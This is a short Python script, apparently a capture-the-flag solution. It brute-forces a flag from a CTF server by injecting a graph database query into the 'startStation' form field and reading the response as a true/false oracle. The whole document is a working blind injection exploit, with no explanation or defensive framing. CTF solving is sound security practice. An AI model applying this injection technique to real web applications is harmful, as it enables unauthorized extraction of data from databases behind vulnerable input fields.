import requests
import string

url = 'http://ctf.dev.tbtl.io:8001'
flag = 'TBTL{'

while True:
    for i in string.ascii_letters + string.digits + "_{}":
        start = f'0}})-[*bfs]-(m {{name: "FLAG"}}) WHERE startsWith(reduce(accumulator = "", var IN values(m)| var), "{flag+i}") RETURN 1 AS distance;//'
        end = 100
        r = requests.post(f'{url}/search', data={'startStation': start, 'endStation': end})
        if 'Distance is 1' in r.text:
            flag += i
            print(flag)
            break
    if flag[-1] == '}':
        break

print(flag)
